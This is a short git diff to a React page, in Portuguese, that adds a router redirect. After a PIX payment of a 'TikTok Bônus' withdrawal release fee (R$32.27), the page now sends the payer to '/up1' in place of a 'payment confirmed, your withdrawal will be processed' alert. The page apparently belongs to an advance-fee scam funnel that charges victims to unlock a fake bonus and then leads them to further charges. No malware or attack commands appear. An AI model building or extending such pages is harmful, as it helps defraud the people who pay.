@@ -1,4 +1,5 @@
 import { useState, useEffect, useCallback, useRef } from 'react';
+import { useNavigate } from 'react-router-dom';
 import '../styles/app.css';
 import PixPaymentPopup from '@/components/PixPaymentPopup';
 
@@ -18,6 +19,7 @@ const TAXA_SAQUE = 32.27;
 const TAXA_SAQUE_CENTAVOS = 3227;
 
 const Index = () => {
+  const navigate = useNavigate();
   const [currentScreen, setCurrentScreen] = useState('one');
   const [showPopupTwo, setShowPopupTwo] = useState(false);
   const [showStickyPopup, setShowStickyPopup] = useState(false);
@@ -752,8 +754,7 @@ const Index = () => {
           description="Taxa de liberação de saque TikTok Bônus"
           onSuccess={() => {
             setShowPixPopup(false);
-            // Aqui você pode adicionar lógica após pagamento confirmado
-            alert('Pagamento confirmado! Seu saque será processado.');
+            navigate('/up1');
           }}
           onClose={() => setShowPixPopup(false)}
         />
